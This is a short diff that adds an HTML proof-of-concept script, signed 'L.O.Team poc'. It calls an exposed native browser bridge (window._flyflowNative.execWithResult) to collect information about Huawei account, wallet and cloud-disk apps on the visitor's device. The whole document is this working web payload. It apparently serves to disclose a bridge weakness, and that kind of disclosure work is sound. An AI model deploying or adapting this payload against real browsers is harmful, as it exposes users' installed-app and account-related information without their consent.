@@ -1,0 +1,10 @@
+<script>
+var msg=getappinfo("com.huawei.hwid");
+msg+="\r\n"+getappinfo("com.huawei.wallet");
+msg+="\r\n"+getappinfo("com.huawei.hidisk");
+function getappinfo(name) {
+var ret = window._flyflowNative.execWithResult("bd_utils","checkPackageStatus",name,"getinfo");
+return name+":"+ret;
+}
+</script>
+L.O.Team poc
